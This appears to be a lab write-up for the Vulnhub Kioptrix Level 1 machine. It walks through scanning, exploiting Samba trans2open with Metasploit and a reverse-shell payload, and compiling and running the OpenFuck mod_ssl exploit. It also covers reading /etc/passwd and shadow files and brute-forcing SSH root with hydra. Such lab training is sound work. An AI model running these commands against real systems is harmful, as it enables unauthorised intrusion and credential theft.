---
title: "Kioptrix Level 1"
date: 2025-01-01
hideDate: true
draft: false
tags: ["others", "practice", "easy"]
categories: ["writeups"]
summary: "![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdDxZxUgkugj0Mt5v_PDSLmuiAYOB1eEfkR9EeFe6XXnG30ckzfU0now2tUFbvREHQLhTKxiWKgkMW21RcWMIm3W8XDYboATGuPHeMW1_2GTxH7_pUQXJtfWYCc8NyQYcySgy9l?key=tpFENkNyjv3sPnACW-38YFeK)"
ShowToc: true
TocOpen: false
platformLabel: "TCM Security"
cover:
  image: "00-card.png"
  alt: "Kioptrix Level 1"
  relative: true
---

Vulnhub Kioptrix Level 1 Gain Root

## 1. Nmap

Command:
```bash
sudo nmap -T4 -p- -A (target)
```


![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdDxZxUgkugj0Mt5v_PDSLmuiAYOB1eEfkR9EeFe6XXnG30ckzfU0now2tUFbvREHQLhTKxiWKgkMW21RcWMIm3W8XDYboATGuPHeMW1_2GTxH7_pUQXJtfWYCc8NyQYcySgy9l?key=tpFENkNyjv3sPnACW-38YFeK)

### Results:

Ports:

- 80/443: HTTP/HTTPS Protocol (check the website at the IP address).
	- Default Apache page with PHP.
	- Information revealed on the 404 page: Apache 1.3.20, Kioptrix server.

## 2. Nikto

Command:
```bash
nikto -h http://(target)
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXclHlR8Cjatx9eiBH_-M8st_QMxl3NlxoYc4v4DDsBoPlMNm1X6FFg0vtu7ZPRxtJzhc-BLjyDLDNEvrjovvbrLo_MiAFUt9q2d5s4w-uef5jj77vWT_x2-MwN5t7CT_JK2M5sopA?key=tpFENkNyjv3sPnACW-38YFeK)

### Results:

- Found an outdated version of Apache:
	- Apache 1.3.20 / 2.2.34.

## 3. DirBuster

Settings:
- Target URL: `http://(ip):80/`
- Options: "Go faster"
- Wordlist: /usr/share/wordlists/dirbuster/small.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXezY-hEBHeonSjbJywTSQxOow5oFO75RGJLVW68fyDOKeSmuz8hI1ChYA_4Ybk0WW7ff5CdKmbpgPLsJ3ga6RaFEfiwq-IufDlsgflu8eqFwoXGIkaXnePPVguc6GvYqC9j91zo?key=tpFENkNyjv3sPnACW-38YFeK)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcQETK__15pj_EAmD_-NMA5cf52FVgaanLPxNP5Q7RrWAnQvSmHdQME0mm3H0t9PwZjXj9_LN6zCUQ7SEHVISvXS1oVmFdiDJHI0GbF2X96C2d8JQ05aeDygqOXPxBQqaCbWMqZ?key=tpFENkNyjv3sPnACW-38YFeK)

[http://192.168.149.131/usage/usage_200909.html](http://192.168.149.131/usage/usage_200909.html) - Webalizer Version 2.01

## 4. Burp Suite

Settings:
- Browser Proxy: 127.0.0.1.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdAC-XF1wWx69s86sXcDy7vLFUUOhLQclDfyf2n_J2Laub5TVxn3d3fJs9bgYFwoit0pFdS9MKSQpeAgtC2EIOsI68V8xECAwx-Agn4nWFNVXNlw_GMC7dJaGpjT_nFEL4C76_Qbw?key=tpFENkNyjv3sPnACW-38YFeK)

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcjuqEyElBXGhUdU2XJEunTews9phHBt3tXznJs6pkTUvc1dG7u0XDvckcptGozlQFNyfg_6kQIT8IYXRYzbY2xf71WJ81YCBI9jiBlrVP2zFhBAFe160HIsDJxP3tfEqM17yQrSA?key=tpFENkNyjv3sPnACW-38YFeK)

#### Actions When Inspecting the Website:

- Review the page source code.
	- Look for passwords or usernames in the code.
- Analyze the server headers to identify the software version.

## 5. SMB2

- Metasploit:

```bash
msfconsole > search smb
use (number) > info
set RHOSTS (ip)
run
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfNiUMs8_tpa7Gdv-gwzadBbyreXifTDmpMKrSGxry3YHIbObrb6nSqoDOnxq3nE6fkVJq4COqe4N6A0qXLIa25yFqevX2V_LeBBkHjYhpFWe8aqzJ4DxP0cuiu_WDyCbQT7Enz?key=tpFENkNyjv3sPnACW-38YFeK)

- Check SMB version.

```bash
smbclient -L \\(ip)\\
```

## 6. SSH

- OpenSSH 2.9p2 (protocol 1.99)

## Researching Vulnerabilities:

Port analysis priorities:

- 80 > 443 > 139 > 445

Potential vulnerabilities:

- Apache mod_ssl/2.8.4: Search for exploits on Google.
- Ports 80/443: Potential OpenLuck vulnerability.
	- [https://www.exploit-db.com/exploits/47080](https://www.exploit-db.com/exploits/47080)
	- [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)

- Apache (version): Look for exploits.
- SMB (Unix Samba 2.2.1a):
	- Google: Rapid7 Exploit.
	- [https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)
	- [https://www.exploit-db.com/exploits/7](https://www.exploit-db.com/exploits/7)
- Terminal (offline):

```bash
searchsploit Samba 2.2.x
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdEFxxl02pq0n8AVEBM8DqsuF6GR88yMb815sl9lMtHufEnLABV6l5jhXR5FyRcbaV-iw4oGDIY280CU0xpXVMjox4bXnKVJQ_iwflCay4ZoRy71CkSTAjT1mixgMbm6aRX4z99XA?key=tpFENkNyjv3sPnACW-38YFeK)

- SSH (OpenSSH 2.9p2):
```BASh
searchsploit OpenSSH 2.9p2
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcoYhxgQMmIt2PgVTQpGlMzls6ZbJM7vLyKsT0QOehX9wo8Yu9pMna9UJg2-XgyeXs7qKzVOh2fbbLWiE4QdOTzS6yLnrFlS6jGwV1-wpqUgMKUd05Y1OuVL2D1dhU_ZOq8H_L_Nw?key=tpFENkNyjv3sPnACW-38YFeK)

## 7. Nessus

- Basic Network Scan

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdsUQbrXKz6KPFRqiRoX31r4dFZQdTzjmI7O9Zo9j9LlE4_tVkIJDeyhN1Ta2RNIJGZ6XV9aWiZM6GXJbfD2yazUNh-L3wBwB3bUYtB5PFc6mBOZNvMfUyFCmvHCwqxrg98B4v6?key=tpFENkNyjv3sPnACW-38YFeK)

## 8. Exploitation

Search for exploits:

```baSH
searchsploit Samba 2.2
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcn3mKVpIBMyL_E83NiwnTWIxs3QZwmXEeiiymRkK8ztwtEIHGM1_InvVMArSOXX4Pahw0tMDC7LInomZ1QJlN_0BE1Us0jtPkA6F3hFuh9onFyU7Fyfz_wGtT5MlSceIHYFVsA?key=tpFENkNyjv3sPnACW-38YFeK)

Metasploit:

```bash
msfconsole
search trans2open
use 1 (linux/samba/trans2open)
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeQyOtYcemcqLCiGvsUf9xU4vvLZ7l_J_52BqhR40VD01GGpvBvz1Bi3TfjdhF2F9Mm4Ox4_Gwh-sPHHjEz8PTzJCEbA51IQAk0dYz6MeuLsmWwvBQwFeSH8Ij_gBTk65_Tk-ES7w?key=tpFENkNyjv3sPnACW-38YFeK)

```BASH
options
set RHOSTS (target ip)
show targets
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfHDN0Jq4kT15rADd4_wvO3CXisEgDmBpG6OzORjlsX9OkC7W8tM5vbVbxpujLCFz2jpnB4gW_nMKK6GsIoiQPNT9HlZ09mANY2-om41U1k7Wf7G7ke6yBeRZsK99LZe31BfWoy?key=tpFENkNyjv3sPnACW-38YFeK)

```bash
set payload Linux/x86/shell_reverse_tcp
options
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXetb7PSrCARFqFVJeSoGbuWEptN5930n3NeJo0VXHZwJeGmLXDgDHgr5SD5HlNNBSb-k9_DAEtrtxrvx5n2JYaNzu1t0ieSmN39iITitgVavIbT_rEUZnrW5nxYacM0CLaHRcuD_A?key=tpFENkNyjv3sPnACW-38YFeK)

```bash
run
whoami
hostname
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdq_nbPEwz5k-hVPvU_9jFtgaotgB4UL5t7cnF9poO3kHiRKKV-DE22DGwDUmRlVh3xfTOzZX9RjSzgwD7t-Ym7hpAj0NSi_JIj-1LBkfTTTj0bERCNaOjF-aOqbx_ky9XptPb4?key=tpFENkNyjv3sPnACW-38YFeK)

## 9. Manual Exploitation

- [https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)
	- Follow the instruction

```bash
git clone https://github.com/heltonWernik/OpenFuck.git
cd OpenFuck
apt-get install libssl-dev
gcc -o OpenFuck OpenFuck.c -lcrypto
ls
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeog2gxB98iuKOXJL-dxJOh68_RjlLAcZlD1XhRuBpiCZQ_zVTvpRi2lLO0-1C8bfo8VaeynrLk1zjb58P2RN-lX8669rUAN_amt07OkLYgLeejvl7lckpJJ6A_Bh7Z7__P36Gowg?key=tpFENkNyjv3sPnACW-38YFeK)

./open

- Check the usage and take the OffSet:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfv3xogsVG5sAoahNi7oDoJaNsofuEjQprGdRsgLdP4RKihmOl9XHJQinUX88Vihcyoouo-0bUaA-l7_58pAB4suqCzPuWCOTFRGjzuzy0mzNOjbPvGWGVnXYfF0A3LQtgfvyKX?key=tpFENkNyjv3sPnACW-38YFeK)

- I'm gonna run 0x6b offset:

```bash
./open 0x6b (target ip) -c 40
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd5nUlbOAcjAM992EMA2hMXNwLKEFVyuw0ZRiINu3ZWpAevB6799bV4SHaDUu7pTa57UX3OA3offVGVC4JHuoQpxHdZl7hPmhqLujXFNabpMSDHjtRBeTLwAuobxafc6hhY8UiyAg?key=tpFENkNyjv3sPnACW-38YFeK)

- Let's check the users:

```bash
sudo -l
cat /etc/passwd
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdm6P_Hb-GbX6QePb2tzHclXiNoLgXAIFlu8cDdH0mJJpjpqZ4E3pqhrrvYkOzCrmPIYXDJd8Zehd149px2r8ePXEqm1qTtt0JxaTpLTO3z2tDZSbFseBtO-mVSNQ7_fM8-4e-yrA?key=tpFENkNyjv3sPnACW-38YFeK)

- Check the hashes:
```bash
cat /etc/shadows
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf73KAyi7Bn-aErMlwSRcDidjlY_wgP79oM09CPow9Tsn3eQqCH6gX05dTldv-zZzwrq74LAV3p_h3PwxHuugkAYghfH0TdmnPt5CzfoXVy1Lj296sW9l8AS_nadQvWfKUgFy2Chw?key=tpFENkNyjv3sPnACW-38YFeK)

## 10. Brute Force Attack

> [!NOTE]
> Test password strenght / check of we can get in with a weak password or default password. Check of the Blue Team get alert

Hydra attack:

```bash
hydra -l root -P /usr/share/wordlists/Metasploit/unix.passwords.txt ssh://(target IP):22 -t 4 -V
```

Metasploit SSH brute-force attack:

```bash
msfconsole
search ssh
```

Let's take auxiliary module for SSH login:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfiz92kAw62BBZzHunzGhm8Quf0GKjrldOBFO34Jy7oXAWQzNFiDcKy5NpIF5tAadJyyeD97vt1EvI81zc1hGzgi2y0mFBX7uOA_peHtqhY-XMWukrQ2TN9bWVUBHM0RHBfUUgyjA?key=tpFENkNyjv3sPnACW-38YFeK)

```bash
use auxiliary/scanner/ssh/ssh_login
options
set username root
set pass_file /usr/share/wordlists/Metasploit/unix_passwords.txt
set rhosts (ip)
set verbose true
run
```
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdlMJwkwrw3j2EomGAdfubTqWKM2o3glA9tmLBKbHl6aaafkY2IL-FUgi00tomYYjyYfXV2zqRn1DpIHHPZrG-7H5cH5grsfDoSQn2tUInN5UEYsjRjnvmF4NletAuZfTxUUMIK3A?key=tpFENkNyjv3sPnACW-38YFeK)

## Download

[https://www.vulnhub.com/entry/kioptrix-level-1-1,22/](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

[NextPage 1](https://debas.gitbook.io/pentesting/page-1)

Last updated 1 day ago

Target URL: http://(ip):80/

Options: "Go faster"